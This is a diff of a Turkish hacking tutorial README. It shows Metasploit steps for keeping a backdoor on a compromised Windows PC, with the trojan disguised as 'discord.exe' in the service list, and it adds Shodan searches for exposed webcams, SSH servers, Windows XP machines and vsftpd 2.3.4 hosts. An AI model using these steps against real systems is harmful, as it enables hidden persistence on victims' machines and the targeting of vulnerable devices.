@@ -71,7 +71,9 @@
 - [17-Hackledikten Sonra](#17-Hackledikten-Sonra)
   - [Hedef PCye Sızdıktan Sonra Kullanılabilecek Komutlar](#Hedef-PCye-Sızdıktan-Sonra-Kullanılabilecek-Komutlar)
   - [Hedef PCyi Hackledikten Sonra Bağlantıyı Sürdürebilir Hale Getirmek](#Hedef-PCyi-Hackledikten-Sonra-Bağlantıyı-Sürdürebilir-Hale-Getirmek)
-
+- [18-Shodan](#Shodan)
+  - [Shodan İçerisinde Filtreleme](#Shodan-İçerisinde-Filtreleme)
+  - [Shodan'ı Terminal Üzerinden Çalıştırmak](#Shodanı-Terminal-Üzerinden-Çalıştırmak)
 
 # 1-VPN DNS MAC 
 
@@ -649,12 +651,36 @@ screenshot: Hedef PC'nin Ekran Görüntüsünü Alır
 
 # Hedef PC'yi Hackledikten Sonra Bağlantıyı Sürdürebilir Hale Getirmek
 
-1.```msfconsole```
-2.```use exploit/windows/local/persistence```
-3.```show options```
-4.```delay 10``` Hedef PC Tekrar Açıldıktan Kaç Saniye Sonra Session'un Açılcağını Belirleriz
-5.```exe_name discord.exe```  Hedef PC'nin Servis Listesinde Görünecek İsim (e.g. discord.exe)
-6.```show advanced```
-7.```set exe::custom /var/www/html/backdoors/tcp backdoor.exe``` Trojan'in Bulunduğu Konum
-8.```exploit```
+1. ```msfconsole```
+2. ```use exploit/windows/local/persistence```
+3. ```show options```
+4. ```delay 10``` Hedef PC Tekrar Açıldıktan Kaç Saniye Sonra Session'un Açılcağını Belirleriz
+5. ```exe_name discord.exe```  Hedef PC'nin Servis Listesinde Görünecek İsim (e.g. discord.exe)
+6. ```show advanced```
+7. ```set exe::custom /var/www/html/backdoors/tcp backdoor.exe``` Trojan'in Bulunduğu Konum
+8. ```exploit```
+
+# 18-Shodan 
+
+Shodan Bilgi Toplama ve Arama Motoru'dur
+
+1. Google'dan ```shodan.io``` adresine giriyoruz
+2. ```webcams``` yazarak daha önceden taglanmiş kameraları görebiliriz 
+3. ```vsat``` yazarak daha önceden taglanmiş uyduları görebiliriz
+4. Çıkan IP'lere tıklayarak kullanılan portları görebiliriz ```(e.g. 123.456.789.123:9000) 9000 portunu kullanıyor```
+
+> ### Shodan İçerisinde Filtreleme 
+
+* ```vsat port:80```: Port 80 çalıştıran web'e çıkış veren uyduları gösterir
+* ```port:22```: SSH Kullanan Servisleri Listeleriz
+* ```port:22 country:"FR" city:"Paris"```: Fransa Parisdeki SSH Sunucularını Listeler
+* ```os:"Windows XP"```: Windows XP kullanan PC'leri Listeler
+* ```os:"Windows XP" country:"US"```: ABD'de Windows XP kullanan PC'leri Listeler
+* ```vsftpd 2.3.4```: ftp 2.3.4 Kullanan Servisleri Gösterir
+
+> ### Shodanı Terminal Üzerinden Çalıştırmak
+
+1. ```shodan```
+2. ```shodan init <API key>``` (IP key shodan sitesinde hesabımıza tanımlanmış key)
+3. ```shodan host 123.456.789.123``` (Arama yapmak istediğimiz sunucu vs. IP'si)
 
